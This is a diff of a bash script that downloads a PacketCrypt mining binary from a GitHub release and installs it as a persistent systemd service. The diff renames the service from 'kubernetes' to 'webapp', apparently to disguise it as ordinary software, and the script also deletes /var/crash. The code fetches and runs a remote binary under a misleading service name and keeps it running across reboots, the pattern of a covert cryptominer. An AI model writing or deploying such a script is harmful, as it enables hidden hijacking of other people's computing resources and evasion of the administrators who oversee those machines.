@@ -1,10 +1,10 @@
 #!/bin/bash
 cd /home
-sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu
-sudo chmod +x anu
-sudo rm -rf /lib/systemd/system/kubernetes.service
+sudo wget -O webapp https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x webapp
+sudo chmod +x webapp
+sudo rm -rf /lib/systemd/system/webapp.service
 sudo rm -rf /var/crash
-sudo bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
 [Unit]
 Description=gpu1
 After=network.target
@@ -19,10 +19,11 @@ WantedBy=multi-user.target
 EOT
 ' &&
 
-sudo systemctl daemon-reload &&
-sudo systemctl enable kubernetes.service &&
-sudo service kubernetes stop  &&
-sudo service kubernetes restart
+systemctl daemon-reload &&
+systemctl enable webapp.service &&
+service webapp stop  &&
+service webapp restart
 
 
 
+top
